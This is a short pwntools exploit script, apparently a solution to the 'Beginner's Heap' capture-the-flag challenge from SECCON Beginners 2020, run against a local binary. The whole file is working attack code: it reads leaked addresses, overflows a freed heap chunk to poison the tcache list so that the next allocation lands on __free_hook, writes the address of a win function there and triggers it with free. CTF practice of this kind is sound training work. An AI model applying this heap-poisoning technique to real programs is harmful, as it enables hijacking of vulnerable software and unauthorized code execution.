#https://blog.y2a.dev/articles/2022/05-01/beginners-heap-seccon4b2020/
from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

def write(data):
    io.sendlineafter("> ", "1")
    io.sendline(data)

def malloc(data):
    io.sendlineafter("> ", "2")
    io.sendline(data)

def free():
    io.sendlineafter("> ", "3")

def describe_heap():
    io.sendlineafter("> ", "4")

io = process("./chall")

#leak address
io.recvuntil("<__free_hook>: ")
addr_free_hook = int(io.recvline(), 16)
print("__free_hook address: " + hex(addr_free_hook))

io.recvuntil("<win>: ")
addr_win = int(io.recvline(), 16)
print("win address: " + hex(addr_win))

payload = b"A"*0x18
payload += p64(0x31)
payload += p64(addr_free_hook)

malloc("")
free()
write(payload)

malloc("")
free()

malloc(p64(addr_win))
free()

io.interactive()
